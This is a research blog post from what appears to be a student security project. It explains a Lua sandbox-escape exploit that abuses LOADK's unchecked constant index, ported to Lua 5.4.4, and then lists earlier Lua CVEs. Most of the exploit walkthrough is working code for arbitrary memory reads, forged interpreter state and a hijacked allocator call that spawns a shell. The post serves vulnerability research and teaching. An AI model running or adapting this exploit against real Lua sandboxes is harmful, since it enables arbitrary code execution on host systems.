---
title: "3. Previous Vulnerabilites"
categories:
  - Uncategorized
tags:
  - Lua
---
We started our security research on Lua by analyzing1-day vulnerabilites. Case studying previous vulnerabilites may be helpful to excavate new vulnerabilites. Specifically, we reviewed sandbox escape vulnerability in Lua v5.2, and previous CVEs related Lua.


# 1. Sandbox escape

The follwing is an analysis of the existing version of the sandbox escaping exploit code of 5.2.4 and applying it to 5.4.4. For modifications according to the version, see [lua-5.4.4-sandbox-escape](https://github.com/Lua-Project/lua-5.4.4-sandbox-escape), and for the existing 5.2.4 version of the exploit code, see [lua-5.2.4-sandbox-escape](https://github.com/erezto/lua-sandbox-escape).

## Contents
- Background
  - tostring
  - Bytecode
  - string.gsub
  - string.dump
- Root Cause
  - LOADK
  - CONSTANTS
- Exploit
  - AAR(Arbitary Address Read)
  - Fake object
  - Call frealloc
- Reference


## Background

### tostring

  If the metatable of the object that came over to the factor as one of the Lua function has `__tostring` as a key value, it is called as function. When an object with data types such as `function`, `table`, `userdata`, and `thread` that exist as built-in inside Lua, the address of the object is exposed as it is as follows.

  ```shell
  Lua 5.4.4  Copyright (C) 1994-2021 Lua.org, PUC-Rio
  > tostring(print)
  function: 0x564ebc5a0ab0
  > 
  ```

### Bytecode

  Lua is a register-based virtual machine. Bytecode is created and interpreted by parsing the code and executed. I'll explain it with an example.

  ```lua
  local function foo()
    local a="a" a="b" a="c" 
    return (#a)
  end

  foo()
  ```

  The `foo` function used in the code above is converted to the byte code below.

  `example of bytecode`
  ![image-center]({{ '/images/previous-vulnerabilities/bytecode1.png' | absolute_url }}){: .align-center}

  This converted byte code is interpreted and executed inside Lua.

### string.gsub

  This function is used to replace some of the strings with other strings. Briefly explaining the operation of the function, it returns a value obtained by replacing the string entered as the first argument with the remaining arguments. For more information, please refer to [string.gsub](http://www.lua.org/manual/5.4/manual.html#pdf-string.gsub).

### string.dump

  Returns a string expressed as a binary chunk of the function passed as an argument. In this case, the binary chunk is the bytecode. After that, you can use it by putting the returned string in the `load` function. For more information, please refer to [string.dump](http://www.lua.org/manual/5.4/manual.html#pdf-string.dump).

## Root cause

### LOADK

  Each bytecode used in Lua occupies 4bytes. Among them, in the case of the LOADK instruction, it has iABx among the follwing instruction formats.

  ![image-center]({{ '/images/previous-vulnerabilities/loadk1.png' | absolute_url }}){: .align-center}

  Also, LOADK has the follwing format.

  ![image-center]({{ '/images/previous-vulnerabilities/loadk2.png' | absolute_url }}){: .align-center}

  where R(A) represents the numbering of the virtual register used in the bytecode. A register corresponding to each number exists (e.g. R(1), R(2), ...) and an operation is performed using it as a variable.

  In addition, in the case of Bx, it means the index of CONSTANTS, which will be explained in detail later. (Specifies the number of variables in the CONSTANTS array.)

  When you see the code that actually runs the LOADK,

  ```c
  vmcase(OP_LOADK) {
        TValue *rb = k + GETARG_Bx(i);
        setobj2s(L, ra, rb);
        vmbreak;
      }
  ```

  The part where the vulnerability occurs is that there is no verification process for the Bx just described. For this reason, if an attacker finds out the address of the CONSTANTS and the offset between the address where the desired value is located and the address of the CONSTANTS, the desired value can be loaded into the desired virtual register.

### CONSTANTS

  CONSTANTS is a space to store variables necessary for function operation, such as function names and strings used in lua bytecode.

  ```c
  static void loadConstants (LoadState *S, Proto *f) {
    int i;
    int n = loadInt(S);
    f->k = luaM_newvectorchecked(S->L, n, TValue);
    f->sizek = n;
  
    /* skipped */

  }
  ```

  CONSTANTS actually used in the code is being used as variable k in the `luaV_execute` function. The variable is allocated space in the above `loadConstants`, and the heap chunk is finally allocated by malloc.

  As mentioned above, the attacker must know the address of CONSTANTS to load the desired value. To solve this, the collectgarbage function is used to induce the attacker to allocate the desired chunk to CONSTANTS.

  The details will be explained in the AAR section.


## Exploit

### AAR(Arbitary Address Read)

  ```lua
  local function _objAddr(o)
    return tonumber(tostring(o):match('^%a+: 0x(%x+)$'),16)
  end

  local function readAddr(addr)
    collectgarbage()

    local function foo()
        local a="a" a="b" a="c" 
        return (#a)
    end

    local _k={}
    local _str={}
    if (tostring(_k)>tostring(_str)) then
        local _t = _str
        _str = _k
        _k = _t
    end
    local _intermid={}
    local _str_addr = _objAddr(_str)

    local _addr = numTo64L(addr - 16)
    local padding_a = string.rep('\65', 8) -- 0x41 padding
    local padding_b = string.rep('\20', 15) -- LUA_VLNGSTR tag padding

    collectgarbage()
    _str = nil
    _intermid=nil
    collectgarbage()
    
    _str = padding_a .. _addr .. padding_b;
    

    foo = string.dump(foo)
    foo = foo:gsub(escapeString(createLOADK(0,2)),
        escapeString(createLOADK(0, (_str_addr+0x20 - _objAddr(_k))/16 ))) 
    _intermid = {}

    collectgarbage()
    _intermid = nil
    _k=nil
    collectgarbage()

    foo = load(foo)
    return foo()
  end


  local function objAddr(o)
    local known_objects = {}
    known_objects['thread'] = 1; known_objects['function']=1; known_objects['userdata']=1; known_objects['table'] = 1;
    local tp = type(o)
    if (known_objects[tp]) then return _objAddr(o) end

    local f = function(a) coroutine.yield(a) end
    local t = coroutine.create(f)
    local top = readAddr(_objAddr(t) + 0x10) 

    coroutine.resume(t, o)
    local addr = readAddr(top)

    return addr
  end

  local function bufferAddress(b)
    return (objAddr(b) + 0x18)
  end
  ```

  The code above is the part that does AAR. Before explaining the `readAddr` function used in AAR, let's first explain about `OP_LEN`, one of the bytecode commands.

  If you use `#` that returns the length of an object in the lua code, `OP_LEN` is used internally in the bytecode.

  ![image-center]({{ '/images/previous-vulnerabilities/AAR1.png' | absolute_url }}){: .align-center}

  The format of the `OP_LEN` bytecode is as above, and looking at the actual code

  ```c
  vmcase(OP_LEN) {
    Protect(luaV_objlen(L, ra, vRB(i)));
    vmbreak;
  }
  ```

  You can see that it calls the `luaV_objlen` function internally. Looking at this

  ```cpp
  /*
  ** Main operation 'ra = #rb'.
  */
  void luaV_objlen (lua_State *L, StkId ra, const TValue *rb) {
    const TValue *tm;
    switch (ttypetag(rb)) {
      /* skipped */
      case LUA_VSHRSTR: {
        setivalue(s2v(ra), tsvalue(rb)->shrlen);
        return;
      }
      case LUA_VLNGSTR: {
        setivalue(s2v(ra), tsvalue(rb)->u.lnglen);
        return;
      }
      /* skipped */
  }

  /*
  ** Header for a string value.
  */
  typedef struct TString {
    CommonHeader;
    lu_byte extra;  /* reserved words for short strings; "has hash" for longs */
    lu_byte shrlen;  /* length for short strings */
    unsigned int hash;
    union {
      size_t lnglen;  /* length for long strings */
      struct TString *hnext;  /* linked list for hash table */
    } u;
    char contents[1];
  } TString;
  ```

  If you look inside the `luaV_objlen` function, it checks the typetag of the `rb` value passed as an argument, and returns `shrlen` in case of `LUA_VSHRSTR` and `lnglen` in case of `LUA_VLNGSTR`.

  Now let's go back to the AAR code and take a look at the `readAddr` function.

  When the `foo` function used in the first part is converted into byte code, it is converted as shown in `example of bytecode`. As mentioned above, by using the vulnerability of `LOADK` the desired address is substituted for the string, and then the value of the desired address is found through the `OP_LEN` instruction.

  The collectgarbage function is used to satisfy the two conditions mentioned in the root cause part. After assigning the declared variable to nil, executing collectgarbage(), and then declaring a variable of the same size, a chunk with the same address is allocated.

  Using this point, it induces the attacker to allocate the chunk of the variable declared by the attacker to the variable `k`, finds the distance between this variable and the desired address, and sets the offset using `string.dump`

  First set the variable `k` you want to assign and the location of the address you want to read.

  ```lua
  local _k={}
  local _str={}
  if (tostring(_k)>tostring(_str)) then
      local _t = _str
      _str = _k
      _k = _t
  end
  ```

  In this code, the `_k` variable must not be located at an address higher than the position of the `_str` variable on the virtual memory addres, so in this case, the two variables are replaced.

  ```lua
  local _addr = numTo64L(addr - 16)
  local padding_a = string.rep('\65', 8) -- 0x41 padding
  local padding_b = string.rep('\20', 15) -- LUA_VLNGSTR tag padding
  ```

  After that, it creates a string padded with a padding value of 0x41, an address subtracted by 0x10 from the address to be read (because the length variable is stored at 0x10 based on the `TString` structure), and a `LUA_VLNSTR` tag. After calculating the position of the generated string, the offset of the `LOADK` instruction is replaced.

  ```lua
  foo = string.dump(foo)
  foo = foo:gsub(escapeString(createLOADK(0,2)),
          escapeString(createLOADK(0, (_str_addr+0x20 - _objAddr(_k))/16 ))) 

  collectgarbage()
  _k=nil
  collectgarbage()

  foo = load(foo)
  return foo()
  ```

  If you execute the `foo` function replaced with `string.gsub` as above, AAR to find out the value assigned to the address attacker wants to read becomes possible. Implement `objAddr`, a function that finds the address of an object using the `readAddr` function implemented in this way.

  ```lua
  local function objAddr(o)
    local known_objects = {}
    known_objects['thread'] = 1; known_objects['function']=1; known_objects['userdata']=1; known_objects['table'] = 1;
    local tp = type(o)
    if (known_objects[tp]) then return _objAddr(o) end

    local f = function(a) coroutine.yield(a) end
    local t = coroutine.create(f)
    local top = readAddr(_objAddr(t) + 0x10) --The field top is in offset 0x10

    coroutine.resume(t, o)
    local addr = readAddr(top)

    return addr
  end
  ```

  In the `objAddr` function, if there are four data types (`thread`, `function`, `userdata`, `table`) in which the address of data is indicated by the `tostring` function, it is obtained directly through `_objAddr`. In other cases, the `readAddr` function is executed using the `top` member variable in `lua_State` after putting it as an argument of the coroutine that executes `coroutine.yield`. The value of the input address is read through two function executions (once the value pointed to by `top`, and once AAR is performed using the value).



### Fake object

  Now, create `fake lua_State` and `fake global_State` using the AAR described above.

  ```lua
  local f = function() coroutine.yield() local a = string.rep('asda', 20) end
  local t = coroutine.create(f)
  coroutine.resume(t)
  local t_addr = objAddr(t)

  local l_G_addr = readAddr(readAddr(t_addr) + 0x18)
  l_G = memcpy(l_G_addr, 1416) -- sizeof(global_State)=1416
  l_G = numTo64L(addr) .. numTo64L(arg) .. l_G:sub(17)
  l_G_addr = bufferAddress(l_G)

  local t_buffer = memcpy(t_addr, 200) -- sizeof(lua_State)=200

  t_buffer = t_buffer:sub(1,14) .. '\01\01' .. t_buffer:sub(17,24).. numTo64L(l_G_addr) .. t_buffer:sub(33)

  collectgarbage()
  t_addr = bufferAddress(t_buffer) -- t_addr = &fake_luaState
  ```

  After creating a `coroutine`, use the `thread` to get the address of `global_State` and copy as much as the size of `global_State` from the address to create a `fake global_State` string. After that, in the same way, the thread (`lua_State`) assigned to the variable `t` is copied to create the `fake lua_State` string. After that, the address to be executed is set to the location of `frealloc` of `fake global_State`, and the address of the first desired argument is set to the location of `ud`. Set the address of the `fake global_State` set in this way as the `l_G` variable of the `fake lua_State`.


### Call frealloc


  We finish the exploit using the `fake lua_State` created in the `Fake Object` table of contents

  ```lua
  local g = function() local a="a" coroutine.resume(a) end

  g = string.dump(g)

  g = g:gsub(escapeString(createLOADK(0,0)),
          escapeString(createLOADK(0, (t_addr-k_addr)/16)))

  collectgarbage()

  -- clean tcache bins

  local t1 = {}
  local t2 = {}
  local t3 = {}
  local t4 = {}
  local t5 = {}
  local t6 = {}
  local t7 = {}

  collectgarbage()

  k=nil
  collectgarbage()

  g, err = load(g)
  g() 

  ```

  We'll use the same trick we used to do the AAR here after declaring the function `g`. During the operation of `g` using `string.dump`, `fake lua_State` is set as an argument of `coroutine.resume(a)` instead of a string. After that, `load(g)` is executed to call the `string.rep` function defined in function `f`. At this time, Lua internally allocates chunks for string creation. During this process, the global_State's `frealloc` function is called, and the `global_State` referenced at this time is a `fake global_State` created by the attacker. So, instead of calling the normal `frealloc`, it calls system(“/bin/sh”) and the attacker can get the shell.


## Exploit flow schematic

![image-center]({{ '/images/previous-vulnerabilities/exploit_flow1.jpeg' | absolute_url }}){: .align-center}

![image-center]({{ '/images/previous-vulnerabilities/exploit_flow2.jpeg' | absolute_url }}){: .align-center}

![image-center]({{ '/images/previous-vulnerabilities/exploit_flow3.jpeg' | absolute_url }}){: .align-center}


## Reference

- [lua-5.2.4-sandbox-escape](https://github.com/erezto/lua-sandbox-escape)
- [lua-5.4.4-sandbox-escape](https://github.com/Lua-Project/lua-5.4.4-sandbox-escape)
- [lua-bytecode](https://www.luac.nl/)
- [lua-5.3-Bytecode-Reference](https://the-ravi-programming-language.readthedocs.io/en/latest/lua_bytecode_reference.html#)
- [Programming-in-Lua](https://www.lua.org/pil/contents.html)
- [github-lua](https://github.com/lua/lua)
- [string.gsub](http://www.lua.org/manual/5.4/manual.html#pdf-string.gsub)
- [string.dump](http://www.lua.org/manual/5.4/manual.html#pdf-string.dump)


<br>
# 2. CVEs related to Lua

There are 10 CVEs related to Lua. You can find them from [this link](https://www.cvedetails.com/vulnerability-list/vendor_id-13641/LUA.html). The most recent one(CVE-2021-43519) is what we had got with our project. We analyzed all of the CVEs(except the recent one) to understand the internal structure of Lua. If you look in detail, you can figure out that most CVEs seem to be far from a critical issue. We made analysis documents for each CVEs.


- CVE-2020-24371
- CVE-2020-24370
- CVE-2020-24369
- CVE-2020-24342
- CVE-2020-15945
- CVE-2020-15889
- CVE-2020-15888
- CVE-2019-6706
- CVE-2014-5461
